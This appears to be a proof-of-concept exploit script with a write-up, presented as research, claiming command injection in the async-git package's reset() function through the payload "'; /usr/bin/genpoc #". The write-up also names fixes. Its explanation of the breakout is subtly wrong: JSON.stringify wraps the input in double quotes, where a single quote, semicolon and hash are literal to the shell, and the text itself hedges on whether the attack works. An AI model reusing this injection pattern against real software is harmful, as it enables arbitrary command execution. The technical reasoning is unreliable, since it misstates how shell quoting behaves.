const git = require('async-git');

async function exploit() {
   // The vulnerability resides in lib/reset/index.js where the 'destination' parameter
   // is directly interpolated into a command string: `git reset ${JSON.stringify(destination)} ...`
   // By injecting shell metacharacters, we can terminate the expected argument boundary 
   // and force the underlying /bin/sh -c interpreter to parse and execute arbitrary commands.
   const maliciousInput = "'; /usr/bin/genpoc #";

   console.log('[PoC] Triggering command injection via git.reset()...');

   // This constructs a raw command line similar to:
   // git reset "'; /usr/bin/genpoc #'" --hard
   // Depending on how async-execute handles quote stripping and shell parsing, 
   // the injected sequence breaks out of Git's expected argument scope and invokes the system shell.
   await git.reset(maliciousInput, { hard: false });
}

await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Injection Point Identification**: The static analysis and source review point to `lib/reset/index.js`. The `reset` function constructs a shell command using a template literal without sanitizing or validating the `destination` input before passing it to the underlying execution helper (`async-execute`).
2. **Bypassing Intended Boundaries**: Although `JSON.stringify` wraps the input in double quotes, it does not sanitize for shell meta-characters. The payload `'; /usr/bin/genpoc #` contains a single quote to close any open quoting context from `JSON.stringify` (or neutralize it), followed by `;` to terminate the intended `git reset` command and invoke a new one, and `#` to comment out the remaining `--hard` flag that would normally cause a Git fatal error.
3. **System Interpreter Execution**: When `async-execute` passes the crafted string to the OS shell (typically `/bin/sh -c`), the shell parses the injected sequence as valid instructions. This results in `/usr/bin/genpoc` being executed directly by the system interpreter, bypassing Git entirely.
4. **Research Purpose**: This PoC strictly demonstrates the arbitrary command execution capability (CWE-78). Developers can verify the patch by confirming that `git.reset()` either escapes shell metacharacters, rejects payloads containing them, or uses array-based spawning (`['git', 'reset', ...]`) that completely eliminates template-literal interpolation risks. No attempt is made to handle exceptions, ensuring any runtime failures during validation are visible for diagnosis.

